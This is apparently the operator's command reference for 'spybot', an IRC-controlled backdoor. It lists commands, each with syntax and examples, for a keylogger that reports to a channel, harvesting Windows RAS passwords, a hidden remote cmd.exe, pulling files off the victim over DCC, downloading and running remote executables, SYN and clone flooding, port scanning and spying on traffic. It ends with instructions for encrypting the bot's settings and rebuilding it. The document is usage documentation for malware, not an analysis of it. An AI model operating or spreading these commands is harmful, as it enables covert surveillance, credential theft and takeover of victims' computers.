Commands list

Login password
raw [raw command]							(example: raw PRIVMSG #spybot1.1 :hello)
list [path+filter]	  						(example: list c:\*.*)
delete [filename]							(example: delete c:\windows\netstat.exe)
execute [filename]
rename [origenamfile] [newfile]						(example: rename c:\windows\netstat.exe c:\windows\netstatbackup.bak)
makedir [dirname]							(example: makedir c:\test\  )
startkeylogger 								(info: starts onlinekeylogger and output's to the channel\query\dcc chat)
stopkeylogger
sendkeys [keys]								(info: simulates keypresses, to simulate return hit ctrl+b (bold in mIRC) and for backspace ctrl+u (underlined in mIRC))
keyboardlights								(info: flashes his keyboard lights 50x)
info									(info: gives some info)
passwords								(info: lists the ras passwords in win 9x)
listprocesses								(info: lists all running proccesses)
killprocess [processname] 						(example: killprocess taskmgr.exe)   NOTE: if with listprocesses the entire path shows up you must use it with killprocess to)
reconnect
disconnect [sec.]							(info: disconnect the bot for x sec. if sec. is not given it disconnect the bot for 30mins.)
quit									(info: bot quits running)
reboot
cd-rom [0/1]								(info: opens\close cd-rom. cd-rom 1 = open cd-rom 0 = close)
syn [host] [port] [delay msec.] [times]					(example: syn 127.0.0.1 80 100 1000)
redirect [input port] [host] [output port]				(example: redirect 100 eu.undernet.org 6667)
threads									(info: will list al threads)
killthread [number]							(info: kills the selected thread)
get [filename]								(example: get c:\windows\system\keylogs.txt will trigger a dcc send on the remote pc)
opencmd									(info: starts cmd.exe on the  remote pc hidden)
cmd [command]								(info: sends a command to cmd.exe example: cmd netstat -an)
scan [start ip address] [port] [delay] [filename] 
example: scan 127.0.0.1 17300 1 portscan.txt 
download [url] [filename]						(example: download http://127.0.0.1/server.exe c:\server.exe)
server [new server address]						(example: server 127.0.0.1)
uninstall								(info: uninstalls server note: it doesnt delete the server only removes the startupkeys)
spy									(info: redirects all travic from the irc server to the dcc chat (only works with dcc chat)
stopspy									(info: stops the spy)
redirectspy								(info: redirects all travic from the port redirect to the dcc chat (only works with dcc chat)
stopredirectspy								(info: stops the port redirect spy)

///////////////////////

ping [ip] [delay in ms.] [times] [size]		
update [www.update.com/update.exe]
loadclones [server] [port] [numberof clones]
rawclones [command]
killclones
syn [host] [port 0 for random] [delay msec.] [times]								


to encrypt the settings use spybot.mrc copy encryptedsettings.ini to your mircdir and type //encryptsettings [your encryption key] (example //encryptsettings dfghsdgrfewr)
you will see 2 new files in your mirc dir encrypt.h and encrypt.c copy them to your spybot dir and run make.bat
if you use encrypted commands enter in mirc //encrypt2 [your ip] [command] (example //encrypt2 127.0.0.1 scan 80.x.x.x 901 2 4 -s

you can use strings like %windir% in your commands